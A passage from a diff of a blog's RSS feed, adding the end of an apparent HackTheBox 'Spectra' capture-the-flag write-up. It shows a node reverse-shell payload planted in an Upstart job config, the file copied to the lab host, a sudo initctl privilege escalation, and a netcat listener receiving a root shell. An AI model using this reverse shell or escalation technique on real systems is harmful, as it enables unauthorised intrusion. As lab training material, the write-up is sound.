+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
+</span><span style="color:#e6db74">    this.pipe(sh.stdin);
+</span><span style="color:#e6db74">    sh.stdout.pipe(this);
+</span><span style="color:#e6db74">    sh.stderr.pipe(this);
+</span><span style="color:#e6db74">    })&#39;</span>
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+$ scp exploit.conf katie@10.10.10.229:/dev/shm
+Password:
+bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
+exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
+</code></pre></div><p>I&rsquo;ll use the following command and setup a <code>nc</code> listener on my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 <span style="color:#f92672">&amp;&amp;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
+</code></pre></div><p>If I check on my listener, I have a root shell now.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+$ nc -nvlp <span style="color:#ae81ff">9001</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35486</span>
+whoami
+root
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</code></pre></div><p><img class="img-container" src="imgs/image-20210627002203606.png" alt="image-20210627002203606"  />
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
+<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
+<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Tenet</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
